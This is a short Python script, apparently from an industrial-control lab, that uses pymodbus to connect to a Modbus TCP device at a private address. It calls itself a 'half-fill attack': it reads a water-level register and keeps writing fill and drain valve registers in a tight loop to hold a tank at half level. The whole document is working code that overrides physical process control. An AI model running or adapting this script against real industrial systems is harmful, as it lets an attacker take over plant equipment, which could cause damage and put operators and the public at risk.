from pymodbus.client import ModbusTcpClient
import time

FACTORY_IP = "192.168.10.107"

client = ModbusTcpClient(FACTORY_IP, port=503)

if not client.connect():
    print("Connection failed")
    exit()

print("Half-fill attack started...")

LOW = 480
HIGH = 520

try:

    while True:

        rr = client.read_input_registers(address=0, count=1)

        if rr.isError() or not rr.registers:
            print("Error reading level")
            continue

        wl = rr.registers[0]

        if wl < LOW:
            client.write_register(address=0, value=1000)
            client.write_register(address=1, value=0)
            state = "FILLING"

        elif wl > HIGH:
            client.write_register(address=0, value=0)
            client.write_register(address=1, value=1000)
            state = "DRAINING"

        else:
            client.write_register(address=0, value=0)
            client.write_register(address=1, value=0)

            print(f"HOLDING at HALF... WL={wl}")


        time.sleep(0)


except KeyboardInterrupt:

    print("Attack stopped")

finally:

    client.close()
    print("Client Connection closed")
